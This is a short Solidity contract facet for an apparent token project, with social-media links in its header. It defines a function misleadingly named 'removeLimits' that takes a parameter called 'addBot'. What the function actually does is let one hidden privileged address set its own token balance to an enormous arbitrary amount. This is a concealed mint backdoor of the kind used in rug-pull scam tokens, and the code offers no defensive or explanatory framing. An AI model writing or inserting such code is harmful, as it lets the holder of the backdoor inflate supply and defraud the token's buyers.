/*
 * SPDX-License-Identifier: MIT
 * Website: https://dx25.com/
 * Twitter: https://twitter.com/dx25labs
 * Telegram: https://t.me/dx25labs
 * Discord: https://discord.com/invite/nPEvPssGPB*/
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
